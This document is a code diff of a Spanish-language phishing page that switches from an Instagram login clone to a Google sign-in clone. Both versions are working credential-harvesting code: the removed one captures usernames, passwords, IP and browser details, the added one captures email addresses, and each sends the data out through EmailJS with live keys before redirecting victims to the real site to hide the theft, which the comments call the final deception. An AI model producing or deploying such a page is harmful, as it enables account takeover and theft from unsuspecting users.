@@ -3,115 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/1_8g92b6890.png" />
+    <title>Iniciar sesión - Cuentas de Google</title>
     <style>
         body {
-            background: #fafafa;
-            /* Degradado clásico de Instagram */
-            background: linear-gradient(to bottom, #f0f2f5, #ffffff); 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f2f2f2;
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
             display: flex;
+            flex-direction: column;
+            height: 100vh;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
         }
 
         .container {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            width: 350px;
-            padding: 40px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            box-shadow: 0 0 10px rgba(0,0,0,0.05);
+            background: white;
+            width: 450px;
+            padding: 48px 40px 30px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            text-align: center;
         }
 
         .logo {
-            margin-bottom: 20px;
-            font-family: 'Grand Hotel', cursive; /* O usa la imagen */
-        }
-        
-        .logo img {
-            width: 175px;
-            margin-top: 10px;
-        }
-
-        form {
-            width: 100%;
+            margin-bottom: 10px;
             display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-
-        input {
-            background-color: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            padding: 12px 8px;
-            font-size: 12px;
-            width: 100%;
-            box-sizing: border-box;
-            color: #262626;
-        }
-
-        input:focus {
-            outline: none;
-            border: 1px solid #a8a8a8;
-        }
-
-        button {
-            background-color: #0095f6;
-            border: none;
-            border-radius: 4px;
-            color: #ffffff;
-            font-weight: 600;
-            padding: 8px;
-            font-size: 14px;
-            cursor: pointer;
-            margin-top: 10px;
-            height: 30px;
-        }
-
-        button:hover {
-            background-color: #1877f2;
-        }
-
-        button:disabled {
-            background-color: #bcdbf9;
-            cursor: default;
-        }
-
-        /* Pantalla de carga */
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            z-index: 1000;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
         }
-
-        .loading-spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #dbdbdb;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+        
+        .logo img {
+            width: 75px;
+            margin-bottom: 10px;
         }
 
-        .loading-text {
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 10px 0;
+            color: #202124;
+        }
+
+        p.subtitle {
+            color: #202124;
+            font-size: 16px;
+            margin-bottom: 35px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 40px;
+            text-align: left;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .input-group input:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px; /* Ajuste por el borde más grueso */
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #5f6368;
+            margin-bottom: 5px;
+        }
+
+        .btn-next {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 13px 24px;
+            border-radius: 4px;
             font-size: 14px;
-            color: #262626;
+            font-weight: 500;
+            cursor: pointer;
+            float: right;
+        }
+
+        .btn-next:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px rgba(60,64,67,0.3);
+        }
+
+        .footer {
+            margin-top: 50px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        /* Spinner de carga (oculto por defecto) */
+        .loader {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
 
         @keyframes spin {
@@ -119,90 +124,91 @@
             100% { transform: rotate(360deg); }
         }
     </style>
-    <!-- Importar fuente de Instagram para el logo -->
-    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
 
     <div class="container">
+        <!-- Logo de Google -->
         <div class="logo">
-            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Instagram Logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.54h13.94c-.58 2.92-2.05 5.38-4.5 7.06l7.27 5.65c5.04-4.65 8.92-11.5 8.92-19.68z"/>
+                <path fill="#FBBC05" d="M11.54 28.37c-.78-2.3-1.22-4.73-1.22-7.37s.44-5.07 1.22-7.37L3.56 10.73C1.43 14.97 0 19.66 0 24s1.43 9.03 3.56 13.27l7.98-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.95-2.13 15.87-5.76l-7.27-5.65c-3.44 2.31-7.86 3.67-12.6 3.67-6.26 0-11.57-4.22-13.43-9.93l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
         </div>
 
-        <form id="login-form">
-            <input type="text" id="user_email" name="user_email" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
-            <input type="password" id="password" name="password" placeholder="Contraseña" required>
+        <h1>Iniciar sesión</h1>
+        <p class="subtitle">Usa tu cuenta de Google para unirte a <strong>Aplicación X</strong></p> <!-- Cambia "Aplicación X" por algo genérico -->
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Correo electrónico o teléfono</label>
+                <input type="email" id="email" name="email" required autocomplete="off">
+            </div>
+
+            <div class="loader" id="loader"></div>
             
-            <button type="submit" id="submit-btn">
-                Iniciar sesión
-            </button>
+            <div style="overflow: hidden;">
+                <button type="submit" class="btn-next" id="btnNext">Siguiente</button>
+            </div>
         </form>
         
-        <div style="margin-top: 15px; font-size: 12px; color: #8e8e8e;">
-            <a href="#" style="color: #8e8e8e; text-decoration: none;">¿Has olvidado la contraseña?</a>
+        <div style="clear: both;"></div>
+        
+        <div style="text-align: left; margin-top: 15px;">
+            <a href="#" style="color: #1a73e8; font-size: 14px; text-decoration: none;">¿Has olvidado tu correo electrónico?</a>
+        </div>
+
+        <div class="footer">
+            <a href="#">Ayuda</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Términos</a>
         </div>
     </div>
 
-    <!-- Pantalla de carga -->
-    <div class="loading-overlay" id="loading-screen">
-        <div class="loading-spinner"></div>
-        <div class="loading-text">Cargando...</div>
-    </div>
-
-    <!-- Script de EmailJS -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function(){
-            // Tu clave pública
-            emailjs.init("q1IUmbgdFeBvmxnvi");
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Inicializa EmailJS
+        (function() {
+            emailjs.init("q1IUmbgdFeBvmxnvi"); 
         })();
 
-        document.addEventListener('DOMContentLoaded', () => {
-            const form = document.getElementById('login-form');
-            const loadingScreen = document.getElementById('loading-screen');
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const btn = document.getElementById('btnNext');
+            const loader = document.getElementById('loader');
+            const formElements = document.querySelectorAll('label, input, .subtitle, a');
 
-            form.addEventListener('submit', function(event) {
-                event.preventDefault();
+            // 1. Efecto de carga
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+            
+            // Ocultar elementos del formulario para que parezca que "se va"
+            formElements.forEach(el => el.style.opacity = '0.5');
 
-                // 1. Mostrar pantalla de carga
-                loadingScreen.style.display = 'flex';
-
-                // 2. Obtener IP del usuario (API gratuita)
-                let userIP = "No disponible";
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => userIP = data.ip)
-                    .catch(error => userIP = "Error obteniendo IP");
-
-                const browserInfo = navigator.userAgent; // Navegador y SO
-                const username = document.getElementById('user_email').value;
-                const password = document.getElementById('password').value;
-
-                // 3. Enviar datos a EmailJS
-                // Asegúrate de que tu template en EmailJS tenga {{user_email}}, {{password}}, {{ip}} y {{browser}}
+            // 2. Simular espera de 2 segundos (como Google)
+            setTimeout(() => {
+                // 3. Enviar datos
                 const templateParams = {
-                    user_email: username,
-                    password: password,
-                    ip: userIP,
-                    browser: browserInfo,
-                    fecha: new Date().toLocaleString()
+                    from_email: email,
+                    message: "Captura realizada"
                 };
 
-                emailjs.sendForm("service_rkpt26i", "template_zl3ywbm", this)
-                    .then(function(response) {
-                        console.log('Datos enviados:', response.status);
-                        // Esperar 2 segundos en la pantalla de carga
-                        setTimeout(function(){
-                            window.location.href = "https://www.instagram.com";
-                        }, 2000);
-
+                emailjs.send('service_rkpt26i', 'template_zl3ywbm', templateParams)
+                    .then(function() {
+                        // 4. Redirigir a Google para el engaño final
+                        window.location.href = "https://accounts.google.com/signin/v2/identifier?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F";
                     }, function(error) {
-                        console.error('Fallo al enviar:', error);
-                        // Incluso si falla, redirigir
-                        window.location.href = "https://www.instagram.com";
+                        console.error('Error:', error);
+                        alert("Error de conexión");
+                        loader.style.display = 'none';
+                        btn.style.display = 'block';
                     });
-            });
+            }, 2000);
         });
     </script>
 </body>
-    </html>
+</html>
